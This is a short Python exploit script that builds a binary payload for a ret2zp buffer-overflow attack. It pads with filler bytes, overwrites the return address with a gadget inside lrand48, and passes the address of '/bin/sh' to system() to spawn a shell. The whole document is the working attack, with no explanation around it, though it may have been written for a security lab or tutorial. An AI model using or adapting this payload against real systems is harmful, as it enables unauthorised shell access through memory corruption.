#ret2zp-exploit.py
import struct

f = open('ret2zp-exploit.bin','wb')
f.write('B'*24)                         # Filler
f.write(struct.pack('<I', 0xb6ea2fd4))  # lrand48 + 28 (overwrites return address from vulnerable)
f.write('BBBB')                         # Filler
f.write(struct.pack('<I', 0xb6f91588))  # address of "/bin/sh"
f.write('BBBB')                         # Filler
f.write(struct.pack('<I', 0xb6eab154))  # address of system
f.close()